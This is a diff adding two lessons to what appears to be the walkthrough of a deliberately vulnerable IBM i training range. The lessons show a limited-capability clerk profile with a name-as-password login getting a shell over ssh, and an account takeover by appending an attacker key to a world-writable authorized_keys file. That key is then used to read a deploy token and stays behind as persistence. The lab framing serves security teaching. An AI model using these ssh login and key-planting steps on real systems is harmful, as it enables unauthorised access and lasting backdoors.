@@ -340,3 +340,46 @@ Flags are checked with `./check-flags.sh`; see [flags in the README](../README.m
 **Consequence in the sim:** An account with no authority over the payroll file reads it, because a privileged login did the copying. The plant leaves the profile changed for every later login too.
 
 **Flag:** As STUDENT, get a copy of the payroll file into the IFS that STUDENT can read, without STUDENT ever being allowed to read APPLIB/PAYROLL. Then play the security officer: open a second session as QSECOFR and run CALL PGM(QP2TERM).
+
+### 17. A clerk with no command line who can still open a shell over ssh
+
+**Where:** ssh listener, 127.0.0.1:2222 (start the range with ./start.sh --services, with asyncssh installed)
+
+**Real-world parallel:** Limited capability is a rule of the 5250 command line. A profile with LMTCPB(*YES) still has all the authority it was given, and any other way in (FTP, ODBC, ssh) applies that authority and nothing more. The ftp-limited-bypass lesson shows it with FTP, this one with a shell.
+
+**Vulnerability:** CLERK has LMTCPB(*YES) and a menu with no way out, but CLERK may read APPLIB/DAILYOPS, and the daemon lets any enabled profile log in. The password is the profile name.
+
+**MITRE ATT&CK:** T1078 Valid Accounts, T1021.004 Remote Services: SSH, T1005 Data from Local System
+
+**Exploit:**
+
+1. Confirm at the 5250 that CLERK has no command line.
+2. ssh -p 2222 CLERK@127.0.0.1 and use CLERK as the password.
+3. cat /QSYS.LIB/APPLIB.LIB/DAILYOPS.FILE, or db2 "select * from applib.dailyops", or system 'DSPLIBL'.
+4. Read the ticket.
+
+**Consequence in the sim:** The clerk who could not leave a menu has a shell, SQL and CL, all with the clerk's own authority.
+
+**Flag:** Use the clerk's own password over ssh to read the shell access review ticket in APPLIB/DAILYOPS.
+
+### 18. A key file anyone can write, and an ssh daemon that does not mind
+
+**Where:** ssh listener, 127.0.0.1:2222 (start the range with ./start.sh --services, with asyncssh installed)
+
+**Real-world parallel:** OpenSSH only trusts a key file that nobody but the owner can write, because a key file is a list of who may log in. Turning that check off (StrictModes no) is sometimes done to make a deployment work, and it turns a permissions slip into an account takeover.
+
+**Vulnerability:** /home/DEVELOPER/.ssh/authorized_keys is writable by everyone, and the daemon's StrictModes is no. STUDENT can read the directory and write the file.
+
+**MITRE ATT&CK:** T1098.004 Account Manipulation: SSH Authorized Keys, T1021.004 Remote Services: SSH, T1078 Valid Accounts
+
+**Exploit:**
+
+1. ssh-keygen -t ed25519 -f demo_key -N '' makes a key pair on your own machine.
+2. Sign on to the 5250 as STUDENT, CALL PGM(QP2TERM), and ls -l /home/DEVELOPER/.ssh. The key file has rw- for everyone.
+3. cat /QOpenSys/etc/ssh/sshd_config.d/10-modes.conf shows StrictModes no.
+4. echo 'ssh-ed25519 AAAA... you' >> /home/DEVELOPER/.ssh/authorized_keys, with your own public key from demo_key.pub.
+5. ssh -p 2222 -i demo_key DEVELOPER@127.0.0.1 and then cat secret.txt.
+
+**Consequence in the sim:** STUDENT becomes DEVELOPER without knowing a password, and the key stays behind as a way back in.
+
+**Flag:** Get into DEVELOPER's account over ssh without DEVELOPER's password, and read the deploy token in /home/DEVELOPER/secret.txt.
